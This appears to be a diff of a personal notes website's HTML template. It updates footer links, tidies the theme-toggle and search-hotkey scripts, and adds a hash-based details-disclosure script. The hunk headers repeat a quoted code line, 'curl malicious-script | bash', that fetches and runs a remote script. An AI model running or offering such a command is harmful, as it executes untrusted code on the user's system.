       <footer class="site-footer" aria-label="Site footer">
-        <div>
-          <p class="section-kicker">/ Site map</p>
-          <p>Static notes, research trails, projects, writing, and contact routes for rigorous computer science reading.</p>
-        </div>
+        <p>Praneeth Suresh · computer science notes, projects, and writing. Notes are public working material; each shows whether it has been reviewed.</p>
         <nav class="footer-links" aria-label="Footer navigation">
-          <a href="/">Home</a>
-          <a href="/research-taste/">Research</a>
-          <a href="/notes/">Notes</a>
-          <a href="/projects/">Projects</a>
-          <a href="/blog/">Writing</a>
+          <a href="/start-here/">Start here</a>
           <a href="/contact/">Contact</a>
-          <a href="/start-here/">Start</a>
-          <a href="/about/">About</a>
           <a href="/cv.pdf" data-analytics-event="cv_download_click">CV</a>
-          <a href="/subscribe/">Subscribe</a>
           <a href="/feed.xml" data-analytics-event="rss_click" data-subscribe-source="footer">RSS</a>
+          <a href="/research-taste/">Research questions</a>
           <a href="/errata/">Errata</a>
           <a href="/sitemap.xml">Sitemap</a>
         </nav>
       </footer>
   
-    </main>
+    </div>
     <script>
       (() => {
         window.notesAnalyticsEvents = window.notesAnalyticsEvents || [];
@@ -234,10 +176,9 @@ curl malicious-script | bash</code></pre></figure><p class="notion-block notion-
           themeToggle.setAttribute("aria-label", "Switch to " + nextTheme + " mode");
         }
 
-        if (themeToggle) {
-          if (!themeToggle.disabled) {
-            renderThemeToggle();
-            themeToggle.addEventListener("click", () => {
+        if (themeToggle && !themeToggle.disabled) {
+          renderThemeToggle();
+          themeToggle.addEventListener("click", () => {
             const nextTheme = currentTheme() === "dark" ? "light" : "dark";
             root.dataset.theme = nextTheme;
             try {
@@ -246,8 +187,7 @@ curl malicious-script | bash</code></pre></figure><p class="notion-block notion-
               // The selected theme still applies for this page when storage is unavailable.
             }
             renderThemeToggle();
-            });
-          }
+          });
         }
 
         function isEditableTarget(target) {
@@ -278,11 +218,13 @@ curl malicious-script | bash</code></pre></figure><p class="notion-block notion-
           const hotkey = event.key.toUpperCase();
           if (hotkey === "/") {
             const searchInput = document.getElementById("topic-search");
+            event.preventDefault();
             if (searchInput) {
-              event.preventDefault();
               searchInput.focus();
-              return;
+            } else {
+              window.location.href = "/notes/#topic-search";
             }
+            return;
           }
 
           const target = Array.from(document.querySelectorAll("[data-hotkey]")).find(
@@ -308,6 +250,31 @@ curl malicious-script | bash</code></pre></figure><p class="notion-block notion-
             subscribeSource: target.dataset.subscribeSource || "",
           });
         });
+      })();
+    </script>
+    <script>
+      (() => {
+        // In-place disclosure (reading paths, topic rows) stays hash-addressable:
+        // opening #path-x or #topic-x expands that section, and toggling updates the URL.
+        function openHashTarget() {
+          if (!window.location.hash) {
+            return;
+          }
+          const target = document.getElementById(decodeURIComponent(window.location.hash.slice(1)));
+          if (target && target.tagName === "DETAILS") {
+            target.open = true;
+          }
+        }
+        openHashTarget();
+        window.addEventListener("hashchange", openHashTarget);
+        document.querySelectorAll("details[data-hash-disclosure]").forEach((details) => {
+          details.addEventListener("toggle", () => {
+            if (details.open && details.id) {
+              history.replaceState(history.state, "", "#" + details.id);
+            }
+          });
+        });
+
       })();
     </script>
   </body>
